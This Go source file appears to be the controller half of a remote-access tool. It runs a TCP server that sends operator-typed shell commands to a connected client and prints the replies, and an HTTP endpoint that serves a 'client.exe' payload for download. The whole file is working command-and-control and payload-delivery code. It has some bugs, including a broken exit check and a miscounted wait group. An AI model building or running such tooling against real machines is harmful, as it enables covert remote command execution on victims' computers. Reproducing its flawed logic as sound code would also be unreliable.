package main

import (
	"bufio"
	"fmt"
	"net"
	"net/http"
	"os"
	"sync"
	"time"
)

const ipAddr = "192.168.29.120" // IP address of the server.
const socketPort = "8000"       // Port address of the socket server.
const httpPort = "55555"         // Port address of the http server.

// Function to host the Socket Server on {socketPort}.
// Dispatched as a goroutine by the main function.
func SocketServer(wg *sync.WaitGroup) {

	// Listens for incoming TCP connections with the service hosted on {ipAddr}:{port}.
	// Exits (panic) the program if it fails.
	server, err := net.Listen("tcp", ipAddr+":"+socketPort)
	if err != nil {
		panic(err)
	}

	// Accept a single incoming connection and initialise the "conn" object
	// with the incoming connections's details.
	conn, err := server.Accept()
	if err != nil {
		panic(err)
	}

	for {
		fmt.Print("> ")

		// Take input (shell command) from the user to execute it on the client side.
		inputReader := bufio.NewReader(os.Stdin)
		input, _ := inputReader.ReadString('\n')
		input = string(len(input)) + input

		// Write input (shell command) to the connection.
		conn.Write([]byte(input))

		// Exit the infinite loop if command is "exit".
		if input == "exit" {
			break
		}

		// Buffer to store the incoming data from the server.
		// Does not work with buff := []byte.
		// Exits the infinite loop if an error is encountered.
		buffer := make([]byte, 2048)
		conn.Read(buffer)

		// Print the buffer (data from client.exe) to the console
		fmt.Println(string(buffer))
	}

	// Decrement the sync.WaitGroup just before exiting the SocketServer function.
	defer wg.Done()

	// Close the connection just before exiting the SocketServer function.
	defer conn.Close()
}

// Function to host the Http Server on {httpPort}.
// Dispatched as a goroutine by the main function.
func HttpServer(wg *sync.WaitGroup) {
	hostedOn := ipAddr + ":" + httpPort

	// Exopse the "/" endpoint to serve the client.exe file.
	http.HandleFunc("/", func(w http.ResponseWriter, r *http.Request) {
		file, err := os.Open("../client/client.exe")
		if err != nil {
			http.Error(w, "File not found", http.StatusNotFound)
			return
		}
		defer file.Close()

		w.Header().Set("Content-Disposition", "attachment; filename=client.exe")
		w.Header().Set("Content-Type", "application/octet-stream")
		http.ServeContent(w, r, "client.exe", time.Now(), file)
	})

	http.ListenAndServe(hostedOn, nil)

	// Decrement the sync.WaitGroup just before exiting the HttpServer function.
	defer wg.Done()
}

func main() {
	var wg sync.WaitGroup

	// Increment the sync.WaitGroup and then dispatch a goroutine to run the SocketServer.
	wg.Add(1)
	go SocketServer(&wg)

	// Increment the sync.WaitGroup and then dispatch a goroutine to run the HttpServer.
	wg.Add(2)
	go HttpServer(&wg)

	// Wait for the sync.WaitGroup to be empty.
	// OR wait sync.WaitGroup value to be 0.
	wg.Wait()
}
